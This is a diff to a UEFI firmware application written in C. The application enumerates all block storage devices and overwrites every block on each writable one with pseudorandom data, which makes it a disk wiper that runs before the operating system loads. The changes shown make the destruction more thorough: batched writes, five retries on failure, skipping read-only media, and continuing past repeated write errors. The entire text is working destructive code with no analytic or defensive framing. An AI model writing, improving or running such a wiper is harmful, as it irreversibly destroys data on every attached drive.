@@ -6,6 +6,9 @@
 #define LCG_A 1664525
 #define LCG_C 1013904223
 #define LCG_M 4294967296ULL
+#define SAFE_BATCH_BLOCKS 8
+#define MAX_BLOCK_SIZE 4096 
+#define MAX_BUFFER_SIZE (SAFE_BATCH_BLOCKS * MAX_BLOCK_SIZE)
 
 static SIMPLE_TEXT_OUTPUT_INTERFACE *ConOut = NULL;
 
@@ -22,11 +25,15 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
     ConOut = SystemTable->ConOut;
 
     EFI_STATUS Status;
-    EFI_BLOCK_IO_PROTOCOL *BlockIo;
+    EFI_BLOCK_IO_PROTOCOL *BlockIo = NULL;
     EFI_HANDLE *HandleBuffer = NULL;
     UINTN HandleCount = 0;
-    UINTN BufferSize = 512;
+    
     UINT8 *Buffer = NULL;
+    Status = BS->AllocatePool(EfiBootServicesData, MAX_BUFFER_SIZE, (void **)&Buffer);
+    if (EFI_ERROR(Status)) {
+        return Status;
+    }
 
     Status = BS->LocateHandleBuffer(
         ByProtocol,
@@ -35,17 +42,15 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
         &HandleCount,
         &HandleBuffer
     );
-    if (EFI_ERROR(Status)) {
-        return Status;
-    }
 
-    Status = BS->AllocatePool(0, BufferSize, (void **)&Buffer);
     if (EFI_ERROR(Status)) {
-        BS->FreePool(HandleBuffer);
+        BS->FreePool(Buffer);
         return Status;
     }
 
     for (UINTN i = 0; i < HandleCount; i++) {
+        BlockIo = NULL;
+
         Status = BS->OpenProtocol(
             HandleBuffer[i], 
             &gEfiBlockIoProtocolGuid, 
@@ -55,37 +60,66 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
             EFI_OPEN_PROTOCOL_BY_HANDLE_PROTOCOL
         );
         
-        if (EFI_ERROR(Status)) {
+        if (EFI_ERROR(Status) || BlockIo == NULL) {
             continue;
         }
 
-        UINTN LastBlock = BlockIo->Media->LastBlock;
-        if (BlockIo->Media->MediaPresent == FALSE) {
-             BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
-             continue;
+        UINTN BlockSize = BlockIo->Media->BlockSize;
+        EFI_LBA LastBlock = BlockIo->Media->LastBlock;
+        
+        if (BlockIo->Media->MediaPresent == FALSE || BlockIo->Media->ReadOnly == TRUE || BlockSize > MAX_BLOCK_SIZE) {
+            BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
+            continue;
         }
 
-        for (UINTN Lba = 0; Lba <= LastBlock; Lba++) {
-            for (UINTN j = 0; j < BufferSize; j++) {
+        UINTN WriteFailures = 0;
+        
+        for (EFI_LBA Lba = 0; Lba <= LastBlock; Lba += SAFE_BATCH_BLOCKS) {
+            UINTN BlocksToWrite = SAFE_BATCH_BLOCKS;
+            UINTN BytesToWrite = SAFE_BATCH_BLOCKS * BlockSize;
+            
+            if (Lba + SAFE_BATCH_BLOCKS > LastBlock) {
+                BlocksToWrite = (UINTN)(LastBlock - Lba + 1);
+                BytesToWrite = BlocksToWrite * BlockSize;
+            }
+
+            for (UINTN j = 0; j < BytesToWrite; j++) {
                 Buffer[j] = (UINT8)(lcg_rand() % 256);
             }
 
-            Status = BlockIo->WriteBlocks(BlockIo, BlockIo->Media->MediaId, Lba, BufferSize, Buffer);
-            if (EFI_ERROR(Status)) {
-                break;
+            for (UINTN retry = 0; retry < 5; retry++) {
+                Status = BlockIo->WriteBlocks(BlockIo, BlockIo->Media->MediaId, Lba, BytesToWrite, Buffer);
+                
+                if (!EFI_ERROR(Status)) {
+                    break;
+                }
+                
+                if (retry == 4) {
+                    WriteFailures++;
+                }
             }
 
-            Status = BlockIo->FlushBlocks(BlockIo);
             if (EFI_ERROR(Status)) {
-                break;
+                if (WriteFailures > 10) { 
+                    break;
+                }
+            } else {
+                Status = BlockIo->FlushBlocks(BlockIo);
+                if (EFI_ERROR(Status)) {
+                }
             }
         }
         
         BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
     }
 
-    BS->FreePool(Buffer);
-    BS->FreePool(HandleBuffer);
+    if (HandleBuffer) {
+        BS->FreePool(HandleBuffer);
+    }
+    
+    if (Buffer) {
+        BS->FreePool(Buffer);
+    }
 
     return EFI_SUCCESS;
 }
